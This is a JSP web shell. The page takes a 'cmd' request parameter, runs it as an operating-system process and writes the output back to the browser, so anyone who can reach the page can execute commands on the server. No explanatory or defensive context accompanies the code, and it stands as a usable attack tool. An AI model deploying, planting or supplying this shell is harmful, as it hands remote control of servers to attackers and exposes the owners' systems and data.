<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@page language="java" pageEncoding="utf-8" %>


<%
  String cmd = request.getParameter("cmd");
  Process process = new ProcessBuilder(new String[]{cmd}).start();
  InputStream is = process.getInputStream();
  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));
  String r = null;
  while((r = bufferedReader.readLine())!=null){
    response.getWriter().println(r);
  }
%>
